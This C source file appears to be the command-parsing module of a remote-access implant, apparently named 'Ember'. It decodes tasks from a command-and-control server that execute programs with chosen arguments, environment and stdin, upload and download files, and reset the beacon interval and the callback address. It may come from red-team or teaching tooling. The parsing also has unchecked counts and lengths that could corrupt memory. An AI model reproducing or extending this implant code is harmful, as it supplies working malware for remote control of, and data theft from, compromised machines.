#define _POSIX_C_SOURCE 200809L // NOLINT

#include <arpa/inet.h>
#include <assert.h>
#include <linux/limits.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "errors.h"
#include "exec.h"
#include "file.h"
#include "serialization.h"
#include "settings.h"
#include "task.h"
#include "utils.h"

int deserialize_exec(task_t *p_task)
{
    uint16_t flags = p_task->hdr.flags;
    uint8_t *src = p_task->raw_data;
    exec_t *p_dest = &p_task->exec;

    size_t num_bytes = 0;

    if ((uint16_t)PATH & flags)
    {
        uint16_t path_len = 0;
        memcpy(&path_len, src, sizeof(uint16_t));
        num_bytes += sizeof(uint16_t);
        path_len = ntohs(path_len);

        if (PATH_MAX > path_len) // last byte is NULL terminator
        {
            memcpy(p_dest->path, src + num_bytes, path_len);
            num_bytes += path_len;
        }
    }

    if ((uint16_t)STDIN & flags)
    {
        memcpy(&p_dest->stdin_len, src + num_bytes, sizeof(uint32_t));
        num_bytes += sizeof(uint32_t);
        p_dest->stdin_len = ntohl((uint32_t)p_dest->stdin_len);

        if ((p_task->hdr.data_len - num_bytes) >= p_dest->stdin_len)
        {
            // Just point to the data, if C2 sent us a bad length it's their fault
            p_dest->stdin_data = src + num_bytes;
            num_bytes += p_dest->stdin_len;
        }
    }

    if ((uint16_t)ARGV & flags)
    {
        uint8_t num_argv = 0;
        memcpy(&num_argv, src + num_bytes, sizeof(uint8_t));
        num_bytes += sizeof(uint8_t);

        for (uint8_t idx = 0; idx < num_argv; idx++)
        {
            p_dest->argv[idx] = (char *)(src + num_bytes);
            num_bytes += strnlen((char *)(src + num_bytes), p_task->hdr.data_len - num_bytes) + 1;
        }
    }

    if ((uint16_t)ENVP & flags)
    {
        uint8_t num_envp = 0;
        memcpy(&num_envp, src + num_bytes, sizeof(uint8_t));
        num_bytes += sizeof(uint8_t);

        for (uint8_t idx = 0; idx < num_envp; idx++)
        {
            p_dest->envp[idx] = (char *)(src + num_bytes);
            num_bytes += strnlen((char *)(src + num_bytes), p_task->hdr.data_len - num_bytes) + 1;
        }
    }

    int err = EMBER_SUCCESS;
    if (num_bytes != p_task->hdr.data_len)
    {
        err = -EMBER_ERROR;
    }

    return err;
}

int deserialize_settings(task_t *p_task)
{
    uint16_t flags = p_task->hdr.flags;
    uint8_t *src = p_task->raw_data;
    settings_t *p_dest = &p_task->settings;

    size_t num_bytes = 0;

    if ((uint16_t)INTERVAL & flags)
    {
        uint32_t interval = 0;
        memcpy(&interval, src, sizeof(uint32_t));
        num_bytes += sizeof(uint32_t);
        p_dest->interval.tv_sec = ntohl(interval);
    }

    if ((uint16_t)WINDOW & flags)
    {
        uint32_t window = 0;
        memcpy(&window, src + num_bytes, sizeof(uint32_t));
        num_bytes += sizeof(uint32_t);
        p_dest->window.tv_sec = ntohl(window);
    }

    if ((uint16_t)CALLBACK & flags)
    {
        memcpy(&p_dest->callback_location.sin_addr.s_addr, src + num_bytes, sizeof(uint32_t));
        num_bytes += sizeof(uint32_t);

        memcpy(&p_dest->callback_location.sin_port, src + num_bytes, sizeof(uint16_t));
        num_bytes += sizeof(uint16_t);
        // Port is already in net order, no need to flip it
    }

    if ((uint16_t)MODE & flags)
    {
        memcpy(&p_dest->mode, src + num_bytes, sizeof(uint8_t));
        num_bytes += sizeof(uint8_t);
    }

    if ((uint16_t)SEED & flags)
    {
        memcpy(&p_dest->seed, src + num_bytes, sizeof(uint32_t));
        num_bytes += sizeof(uint32_t);
    }

    int err = EMBER_SUCCESS;
    if (num_bytes != p_task->hdr.data_len)
    {
        err = -EMBER_ERROR;
    }

    return err;
}

int deserialize_task(task_t *p_dest)
{
    assert(NULL != p_dest); // NOLINT (misc-include-cleaner)

    int err = EMBER_SUCCESS;

    switch (p_dest->hdr.op_code)
    {
    case SETTINGS:
        err = deserialize_settings(p_dest);
        break;
    case EXEC:
        err = deserialize_exec(p_dest);
        break;
    case DOWNLOAD: // NOLINT (bugprone-branch-clone)
        memcpy(p_dest->file.path, p_dest->raw_data, MIN(p_dest->hdr.data_len, PATH_MAX - 1));
        break;
    case UPLOAD: // NOLINT (bugprone-branch-clone)
        memcpy(p_dest->file.path, p_dest->raw_data, MIN(p_dest->hdr.data_len, PATH_MAX - 1));
        break;
    case DISCONNECT: // NOLINT (bugprone-branch-clone)
        break;
    case EXIT: // NOLINT (bugprone-branch-clone)
        break;
    default:
        err = -EMBER_ERROR;
        break;
    }

    return err;
}

void deserialize_task_header(task_header_t *p_hdr, const uint8_t *recv_buf)
{
    assert((NULL != p_hdr) && (NULL != recv_buf));

    uint32_t bytes_deser = 0;

    memcpy(&p_hdr->op_code, recv_buf, sizeof(uint8_t));
    bytes_deser += sizeof(uint8_t);

    memcpy(&p_hdr->pad_len, recv_buf + bytes_deser, sizeof(uint8_t));
    bytes_deser += sizeof(uint8_t);

    memcpy(&p_hdr->flags, recv_buf + bytes_deser, sizeof(uint16_t));
    bytes_deser += sizeof(uint16_t);

    memcpy(&p_hdr->perms, recv_buf + bytes_deser, sizeof(uint16_t));
    bytes_deser += sizeof(uint16_t);

    memcpy(&p_hdr->data_len, recv_buf + bytes_deser, sizeof(uint32_t));
    bytes_deser += sizeof(uint32_t);

    memcpy(&p_hdr->file_len, recv_buf + bytes_deser, sizeof(uint64_t));

    p_hdr->flags = ntohs(p_hdr->flags);
    p_hdr->perms = ntohs(p_hdr->perms);
    p_hdr->data_len = ntohl(p_hdr->data_len);
    p_hdr->file_len = utils_ntohll(p_hdr->file_len);
}
